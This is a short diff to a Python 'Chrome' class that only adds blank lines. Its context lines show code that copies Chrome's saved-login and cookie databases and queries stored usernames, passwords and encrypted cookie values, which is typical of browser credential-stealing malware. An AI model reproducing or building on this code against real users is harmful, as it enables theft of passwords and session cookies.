@@ -47,6 +47,7 @@ class Chrome:
             shutil.copy2(login_db, login_db_copy)
             conn = sqlite3.connect(login_db_copy)
             cursor = conn.cursor()
+            
             try:
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
@@ -74,6 +75,7 @@ class Chrome:
             shutil.copy2(cookies_db, cookies_db_copy)
             conn = sqlite3.connect(cookies_db_copy)
             cursor = conn.cursor()
+            
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
 
